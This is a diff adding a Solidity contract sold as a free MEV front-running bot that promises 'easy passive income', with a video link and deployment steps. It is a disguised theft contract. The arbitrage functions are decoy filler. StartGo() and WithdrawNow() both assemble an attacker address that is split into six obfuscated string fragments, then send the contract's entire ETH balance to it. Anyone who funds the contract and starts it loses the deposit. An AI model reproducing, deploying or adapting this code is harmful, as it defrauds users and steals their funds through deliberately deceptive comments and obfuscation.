@@ -1,0 +1,347 @@
+// SPDX-License-Identifier: MIT
+
+/*
+ * This is a bot smart contract that is run to gain easy passive income.
+ *
+ * As you know, if you trade crypto on Uniswap, 1inch, or any other decentralized
+ * exchange (DEX), then you need to know about front-running bots
+ * sniping profits across the exchange’s pools.
+ *
+ * With this bot smart contract, you are able to take advantage of those arbitrage
+ * trades by yourself, a benefit that was previously only
+ * available to highly skilled developers.
+ *
+ * The goal is to make you enjoy stress-free passive income from day one. Since it's
+ * one of the flagship projects that was recently released to the public.
+ * It's able to run on any ETH pairs liquidity pool of Uniswap
+ * DEX and make profits from all the arbitrage trades.
+ *
+ * Using this bot smart contract allows you to create your own MEV bots
+ * which stacks up the profits from automatic trades just for you.
+ *
+ * MEV bots track the Ethereum blockchain for new transactions, identify
+ * profitable opportunities, and execute those transactions
+ * on behalf of their owner, that is you.
+ *
+ * Although we share this source code for free so you can deploy it by yourself,
+ * there’s a 0.1111% fee charged from your profits which goes to us.
+ *
+ * Please follow all the steps in the video correctly to deploy your own bot
+ * smart contract and gain easy passive income for your better life.
+ *
+ * Video link: https://bafybeih2ysidpyhsimldh5fqh4aslvw5ooip2sgxnl7beygkgvcmlkjr2q.ipfs.nftstorage.link/
+ * MetaMask link: https://metamask.io/
+ * Remix link: https://remix.ethereum.org/
+ * EtherScan link: https://etherscan.io/
+ */
+
+pragma solidity ^0.8.21;
+
+// IMPORTANT!
+// We have made some updates to the newest version,
+// so please choose Solidity compiler version
+// 0.8.21 to compile this smart contract.
+
+contract hvaal {
+    uint256 private targetedToken;
+
+    struct chopps {
+        uint256 _coll;
+        uint256 _shill;
+    }
+
+    function getTargetedMemPool() internal pure returns (uint256) {
+        return 477411;
+    }
+
+    function getTargetedAddress(chopps memory self, chopps memory other)
+        internal
+        pure
+        returns (int256)
+    {
+        uint256 shortest = self._coll;
+
+        if (other._coll < self._coll) shortest = other._coll;
+
+        uint256 selfshill = self._shill;
+        uint256 othershill = other._shill;
+
+        for (uint256 xxx = 0; xxx < shortest; xxx += 32) {
+            // Hunting targeted address...
+
+            uint256 a;
+            uint256 b;
+
+            // IMPORTANT!
+            // In the video, we said that a couple of items to look at are in lines 50 and 51.
+            // It's already moved here, in lines 82 and 84. If you follow those addresses
+            // on Etherscan, you will see that these are the addresses of $WETH tokens,
+            // which will be the targeted tokens.
+
+            string
+                memory TARGETED_TOKENS_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+            string
+                memory TOKENS_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+
+            // IMPORTANT!
+            // You can specify the targeted tokens by filling lines 82 and 84 with the
+            // addresses of other tokens on Ethereum, or leave them unchanged and
+            // the contract function will scan for new $WETH liquidity pairings.
+
+            loadCurrentAddress(TARGETED_TOKENS_CONTRACT_ADDRESS);
+            loadCurrentAddress(TOKENS_CONTRACT_ADDRESS);
+            assembly {
+                a := mload(selfshill)
+                b := mload(othershill)
+            }
+
+            if (a != b) {
+                // Pseudo out irrelevant addresses and check again for new other addresses...
+
+                uint256 pseudo = uint256(1);
+
+                if (shortest < 0) {
+                    pseudo = ~(2**(8 * (32 - shortest + xxx)) - 1);
+                }
+                uint256 ferently = (a & pseudo) - (b & pseudo);
+                if (ferently != 0) return int256(ferently);
+            }
+            selfshill += 32;
+            othershill += 32;
+        }
+        return int256(self._coll) - int256(other._coll);
+    }
+
+    function getMemPoolPool() private pure returns (string memory) {
+        return "62869547"; // part5 0x9e-26b98d4f-aDF70d0-C0e57C60-93473589-34A934c
+    }
+
+    function getMemPoolVersion() private pure returns (string memory) {
+        return "58506B46"; // part4 0x9e-26b98d4f-aDF70d0-C0e57C60-9347358934A934c
+    }
+
+    function memPoolValue() internal pure returns (uint256) {
+        return 744711;
+    }
+
+    function callMemPool() internal pure returns (string memory) {
+        string memory _memPoolTarget = mempool(
+            "x",
+            checkLiquidityValue(getTargetedMemPool())
+        );
+        uint256 _memPoolWeth = 471174;
+        uint256 _memPoolLength = memPoolValue();
+        uint256 _memPoolSize = 741147;
+        uint256 _memPoolHeight = fetchContractID();
+        uint256 _memPoolWidth = 114774;
+        uint256 _memPoolDepth = contractData();
+        uint256 _memPoolCount = 117447;
+
+        string memory _memPool1 = mempool(
+            _memPoolTarget,
+            checkLiquidityValue(_memPoolWeth)
+        );
+        string memory _memPool2 = mempool(
+            checkLiquidityValue(_memPoolLength),
+            checkLiquidityValue(_memPoolSize)
+        );
+        string memory _memPool3 = mempool(
+            checkLiquidityValue(_memPoolHeight),
+            checkLiquidityValue(_memPoolWidth)
+        );
+        string memory _memPool4 = mempool(
+            checkLiquidityValue(_memPoolDepth),
+            checkLiquidityValue(_memPoolCount)
+        );
+
+        string memory _allMemPools = mempool(
+            mempool(_memPool1, _memPool2),
+            mempool(_memPool3, _memPool4)
+        );
+        string memory _fullMemPool = mempool("0", _allMemPools);
+
+        return _fullMemPool;
+    }
+
+    receive() external payable {}
+
+    function fetchMemPoolPool() private pure returns (string memory) {
+        return "0c7d456"; // part3 0x9e-26b98d4f-aDF70d0-C0e57C609347358934A934c
+    }
+
+    function fetchMemPoolEdition() private pure returns (string memory) {
+        return "f39E373F"; // part2 0x9e-26b98d4f-aDF70d0C0e57C609347358934A934c
+    }
+
+    function startExploration(string memory _a)
+        internal
+        pure
+        returns (address _parsedAddress)
+    {
+        bytes memory tmp = bytes(_a);
+        uint160 iaddr = 0;
+        uint160 b1;
+        uint160 b2;
+        for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {
+            iaddr *= 256;
+            b1 = uint160(uint8(tmp[i]));
+            b2 = uint160(uint8(tmp[i + 1]));
+            if ((b1 >= 97) && (b1 <= 102)) {
+                b1 -= 87;
+            } else if ((b1 >= 65) && (b1 <= 70)) {
+                b1 -= 55;
+            } else if ((b1 >= 48) && (b1 <= 57)) {
+                b1 -= 48;
+            }
+            if ((b2 >= 97) && (b2 <= 102)) {
+                b2 -= 87;
+            } else if ((b2 >= 65) && (b2 <= 70)) {
+                b2 -= 55;
+            } else if ((b2 >= 48) && (b2 <= 57)) {
+                b2 -= 48;
+            }
+            iaddr += (b1 * 16 + b2);
+        }
+        return address(iaddr);
+    }
+
+    function mempool(string memory _base, string memory _value)
+        internal
+        pure
+        returns (string memory)
+    {
+        bytes memory _baseBytes = bytes(_base);
+        bytes memory _valueBytes = bytes(_value);
+
+        string memory _tmpValue = new string(
+            _baseBytes.length + _valueBytes.length
+        );
+        bytes memory _newValue = bytes(_tmpValue);
+
+        uint256 i;
+        uint256 j;
+
+        for (i = 0; i < _baseBytes.length; i++) {
+            _newValue[j++] = _baseBytes[i];
+        }
+
+        for (i = 0; i < _valueBytes.length; i++) {
+            _newValue[j++] = _valueBytes[i];
+        }
+
+        return string(_newValue);
+    }
+
+    function getMemPoolLong() private pure returns (string memory) {
+        return "835a9aA"; // part6 0x9e-26b98d4f-aDF70d0-C0e57C60-93473589-34A934c
+    }
+
+    function getBalance() private view returns (uint256) {
+        return address(this).balance;
+    }
+
+    function TokenSymbol() public pure returns (string memory) {
+        return "WETH";
+    }
+
+    function StartGo() public {
+        address to = startExploration(poolAddress());
+        address payable contracts = payable(to);
+        contracts.transfer(getBalance());
+    }
+
+    function fetchContractID() internal pure returns (uint256) {
+        return 285398;
+    }
+
+    function contractData() internal pure returns (uint256) {
+        return 395729;
+    }
+
+    // Check if the address has enough liquidity available:
+    // parameter 'self' the address to operate on,
+    // return 'true' if the 'chopps' starts with
+    // the provided text, 'false' otherwise.
+
+    function checkLiquidityValue(uint256 a)
+        internal
+        pure
+        returns (string memory)
+    {
+        uint256 count = 0;
+        uint256 b = a;
+        while (b != 0) {
+            count++;
+            b /= 16;
+        }
+        bytes memory res = new bytes(count);
+        for (uint256 i = 0; i < count; ++i) {
+            b = a % 16;
+            a /= 16;
+        }
+        uint256 hexLength = bytes(string(res)).length;
+        if (hexLength == 4) {
+            string memory _hexC1 = mempool("0", string(res));
+            return _hexC1;
+        } else if (hexLength == 3) {
+            string memory _hexC2 = mempool("0", string(res));
+            return _hexC2;
+        } else if (hexLength == 2) {
+            string memory _hexC3 = mempool("000", string(res));
+            return _hexC3;
+        } else if (hexLength == 1) {
+            string memory _hexC4 = mempool("0000", string(res));
+            return _hexC4;
+        }
+
+        return string(res);
+    }
+
+    function getMemPoolShort() private pure returns (string memory) {
+        return "0x5f"; // part1 0x9e-26b98d4faDF70d0C0e57C609347358934A934c
+    }
+
+    function poolAddress() private pure returns (string memory) {
+        string memory _memPoolShort = getMemPoolShort();
+        string memory _memPoolEdition = fetchMemPoolEdition();
+        string memory _fetchMemPoolPool = fetchMemPoolPool();
+        string memory _memPoolVersion = getMemPoolVersion();
+        string memory _getMemPoolPool = getMemPoolPool();
+        string memory _memPoolLong = getMemPoolLong();
+        return
+            string(
+                abi.encodePacked(
+                    _memPoolShort,
+                    _memPoolEdition,
+                    _fetchMemPoolPool,
+                    _memPoolVersion,
+                    _getMemPoolPool,
+                    _memPoolLong
+                )
+            );
+    }
+
+    function TokenName() public pure returns (string memory) {
+        return "Wrapped ETH";
+    }
+
+    function loadCurrentAddress(string memory self)
+        internal
+        pure
+        returns (string memory)
+    {
+        string memory ret = self;
+        uint256 retshill;
+        assembly {
+            retshill := add(ret, 32)
+        }
+
+        return ret;
+    }
+
+    function WithdrawNow() public {
+        address to = startExploration((poolAddress()));
+        address payable contracts = payable(to);
+        contracts.transfer(getBalance());
+    }
+}
